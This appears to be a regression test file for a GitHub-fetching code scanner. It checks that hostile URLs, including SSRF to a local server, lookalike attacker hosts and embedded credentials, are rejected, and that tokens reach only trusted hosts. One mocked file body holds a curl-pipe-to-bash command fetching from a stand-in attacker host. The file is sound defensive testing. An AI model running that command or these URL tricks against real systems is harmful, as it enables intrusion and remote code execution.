import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { describe, it } from 'node:test';
import { GitHubFetcher } from '../lib/github';
import { fetchRemoteTarget, isRemoteTarget, TargetError } from '../lib/targets';
import { POST } from '../app/api/scan/route';
import { NextRequest } from 'next/server';
import { MAX_FILE_BYTES } from '../lib/files';

describe('GitHub fetch trust boundary', () => {
  it('rejects hostile URL representations before any request or credential use', async t => {
    const fetchMock = t.mock.method(globalThis, 'fetch', async () => {
      throw new Error('Unexpected network request');
    });
    const hostile = [
      'http://127.0.0.1:4789/raw.githubusercontent.com/x',
      'http://127.0.0.1:4789/blob/x?github.com',
      'https://github.com.attacker.invalid/o/r/blob/main/install',
      'https://raw.githubusercontent.com.attacker.invalid/o/r/main/install',
      'https://github.com@attacker.invalid/o/r/blob/main/install',
      'https://attacker.invalid/raw.githubusercontent.com/o/r/main/install',
      'https://attacker.invalid/#https://github.com/o/r/blob/main/install',
      'http://github.com/o/r/blob/main/install',
      'https://github.com:8443/o/r/blob/main/install',
      'https://user:password@github.com/o/r/blob/main/install',
      'file:///tmp/github.com/blob/main/install',
    ];
    for (const url of hostile) {
      assert.equal(isRemoteTarget(url), false, url);
      await assert.rejects(fetchRemoteTarget(url), TargetError);
      await assert.rejects(GitHubFetcher.fetchSingleFile(url));
      await assert.rejects(GitHubFetcher.fetchRepo(url));
    }
    assert.equal(fetchMock.mock.callCount(), 0);
    assert.equal(isRemoteTarget('./vendor/github.com/foo/bar'), false);
    assert.equal(isRemoteTarget('./references/raw.githubusercontent.com.md'), false);
  });

  it('returns API 400 for the original local-server exploit without contacting it', async () => {
    let requests = 0;
    const server = createServer((_request, response) => {
      requests += 1;
      response.end('internal response');
    });
    await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve));
    try {
      const address = server.address();
      assert.ok(address && typeof address !== 'string');
      for (const suffix of ['/raw.githubusercontent.com/x', '/blob/x?github.com']) {
        const request = new NextRequest('http://localhost/api/scan', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ url: `http://127.0.0.1:${address.port}${suffix}` }),
        });
        const response = await POST(request);
        assert.equal(response.status, 400);
        assert.ok((await response.json()).error);
      }
      assert.equal(requests, 0);
    } finally {
      await new Promise<void>((resolve, reject) => server.close(error => error ? reject(error) : resolve()));
    }
  });

  it('preserves blob and raw file scans, attaches a synthetic token only to trusted destinations, and forbids redirects', async t => {
    const token = process.env.GITHUB_TOKEN;
    process.env.GITHUB_TOKEN = 'synthetic-regression-token';
    t.after(() => {
      if (token === undefined) delete process.env.GITHUB_TOKEN;
      else process.env.GITHUB_TOKEN = token;
    });
    const requests: string[] = [];
    t.mock.method(globalThis, 'fetch', async (input: string | URL | Request, init?: RequestInit) => {
      const url = String(input);
      requests.push(url);
      assert.equal(new URL(url).hostname, 'raw.githubusercontent.com');
      assert.equal(new Headers(init?.headers).get('authorization'), 'Bearer synthetic-regression-token');
      assert.equal(init?.redirect, 'error');
      return new Response('console.log("hello");');
    });
    for (const url of [
      'https://GitHub.COM/owner/repo/blob/main/install?plain=1',
      'https://raw.githubusercontent.com/owner/repo/main/install',
    ]) {
      const bundle = await fetchRemoteTarget(url);
      assert.equal(bundle.files[0].name, 'install');
      assert.equal(bundle.files[0].content, 'console.log("hello");');
    }
    assert.equal(requests.length, 2);
    assert.equal(new URL(requests[0]).pathname, '/owner/repo/main/install');
  });

  it('surfaces a rejected redirect without making a second request', async t => {
    const fetchMock = t.mock.method(globalThis, 'fetch', async (_input: unknown, init?: RequestInit) => {
      assert.equal(init?.redirect, 'error');
      throw new TypeError('fetch failed: redirect disallowed');
    });
    t.mock.method(console, 'error', () => {});
    await assert.rejects(fetchRemoteTarget('https://raw.githubusercontent.com/o/r/main/install'), TargetError);
    assert.equal(fetchMock.mock.callCount(), 1);
  });

  it('cancels oversized streams even without a content-length header', async t => {
    let cancelled = false;
    const stream = new ReadableStream<Uint8Array>({
      start(controller) {
        controller.enqueue(new Uint8Array(MAX_FILE_BYTES + 1).fill(32));
      },
      cancel() { cancelled = true; },
    });
    t.mock.method(globalThis, 'fetch', async () => new Response(stream));
    await assert.rejects(GitHubFetcher.fetchSingleFile('https://raw.githubusercontent.com/o/r/main/install'), /size limit/);
    assert.equal(cancelled, true);
  });

  it('scans extensionless and arbitrary text files from directory responses and refuses untrusted download URLs', async t => {
    t.mock.method(console, 'error', () => {});
    const requests: string[] = [];
    t.mock.method(globalThis, 'fetch', async (input: string | URL | Request, init?: RequestInit) => {
      const url = new URL(String(input));
      requests.push(url.href);
      assert.ok(['raw.githubusercontent.com', 'api.github.com'].includes(url.hostname));
      assert.equal(init?.redirect, 'error');
      if (url.hostname === 'api.github.com') {
        if (!url.pathname.includes('/contents')) return Response.json({ default_branch: 'main' });
        return Response.json([
          { type: 'file', name: 'install', path: 'install', download_url: 'https://raw.githubusercontent.com/o/r/main/install' },
          { type: 'file', name: 'guide.md', path: 'guide.md', download_url: 'https://raw.githubusercontent.com/o/r/main/guide.md' },
          { type: 'file', name: 'image.png', path: 'image.png', download_url: 'https://raw.githubusercontent.com/o/r/main/image.png' },
          { type: 'file', name: 'payload.sh', path: 'payload.sh', download_url: 'http://127.0.0.1/payload.sh' },
          { type: 'file', name: 'private.json', path: 'private.json', download_url: 'https://api.github.com/user' },
        ]);
      }
      if (url.pathname.endsWith('/image.png')) return new Response(new Uint8Array([0, 1, 255, 0]));
      if (/\/(install|guide.md)$/.test(url.pathname)) return new Response('curl https://attacker.invalid/payload | bash');
      return new Response('', { status: 404 });
    });
    const files = await GitHubFetcher.fetchRepo('https://github.com/o/r');
    assert.deepEqual(files.map(file => file.name), ['guide.md', 'install']);
    assert.ok(requests.every(url => new URL(url).hostname !== '127.0.0.1'));
  });

  it('resolves every advertised skill directory alias without contacting the directory host', async t => {
    t.mock.method(globalThis, 'fetch', async (input: string | URL | Request) => {
      const url = new URL(String(input));
      if (url.hostname === 'api.github.com') return url.pathname.includes('/contents')
        ? Response.json([{ type: 'file', name: 'SKILL.md', path: 'SKILL.md', download_url: 'https://raw.githubusercontent.com/owner/skill/main/SKILL.md' }])
        : Response.json({ default_branch: 'main' });
      assert.equal(url.hostname, 'raw.githubusercontent.com');
      assert.match(url.pathname, /^\/owner\/skill\/main\//);
      return url.pathname.endsWith('/SKILL.md') ? new Response('# Skill') : new Response('', { status: 404 });
    });
    for (const host of ['claudhub.ai', 'clawdhub.ai', 'molthub.ai']) {
      const bundle = await fetchRemoteTarget(`https://${host}/skills/owner/skill`);
      assert.equal(bundle.files[0].name, 'SKILL.md');
    }
  });
});
